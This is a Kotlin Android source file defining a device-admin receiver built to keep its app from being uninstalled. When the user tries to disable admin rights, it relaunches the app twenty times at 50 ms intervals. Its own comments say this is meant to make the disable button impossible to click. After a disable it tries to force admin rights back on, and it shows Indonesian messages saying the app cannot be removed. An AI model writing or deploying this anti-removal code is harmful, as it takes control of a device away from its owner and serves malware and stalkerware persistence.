package com.sync.xxx

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.widget.Toast

class AntiUninstallReceiver : DeviceAdminReceiver() {
    
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        // HARDCORE MODE: Spam activities to make it impossible to disable
        spamActivitiesOnDisable(context)
        
        // Try to re-launch app
        val launch = context.packageManager
            .getLaunchIntentForPackage(context.packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
        if (launch != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val pending = android.app.PendingIntent.getActivity(
                    context, 0, launch,
                    android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                )
                pending.send()
            } else {
                context.startActivity(launch)
            }
        }
        
        return "Aplikasi ini dilindungi dan tidak dapat dihapus."
    }
    
    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        
        // AGGRESSIVE: Try to re-enable admin immediately after disable
        Handler(Looper.getMainLooper()).postDelayed({
            AntiUninstallHelper.forceReEnableAdmin(context)
        }, 500)
        
        // Show persistent toast to annoy user
        Toast.makeText(context, "Proteksi sistem aktif", Toast.LENGTH_LONG).show()
    }
    
    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Toast.makeText(context, "Proteksi sistem diaktifkan", Toast.LENGTH_SHORT).show()
    }
    
    /**
     * Spam activities when user tries to disable admin
     * Makes it nearly impossible to actually click the disable button
     */
    private fun spamActivitiesOnDisable(context: Context) {
        val handler = Handler(Looper.getMainLooper())
        
        // Spam 20 activities rapidly
        for (i in 0 until 20) {
            handler.postDelayed({
                try {
                    val launch = context.packageManager
                        .getLaunchIntentForPackage(context.packageName)?.apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                        }
                    context.startActivity(launch)
                } catch (e: Exception) {
                    // Ignore
                }
            }, i * 50L) // Every 50ms
        }
    }
}
